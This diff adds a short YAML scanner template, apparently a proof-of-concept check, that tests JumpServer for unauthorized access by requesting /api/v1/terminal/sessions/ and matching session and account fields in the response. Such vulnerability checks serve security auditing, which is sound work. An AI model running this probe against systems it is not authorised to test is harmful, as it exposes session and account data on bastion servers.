@@ -1,0 +1,14 @@
+id: poc-yaml-jumpserver-session-unauthorized-access
+info:
+  name: JumpServer-Session-未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: jumpserver
+requests:
+- method: GET
+  path: /api/v1/terminal/sessions/
+  expression: status_code == 200 && contains(body, "asset_id") && contains(body, "next")
+    && contains(body, "account") && contains(body, "account_id")
+variables: {}
+transport: http
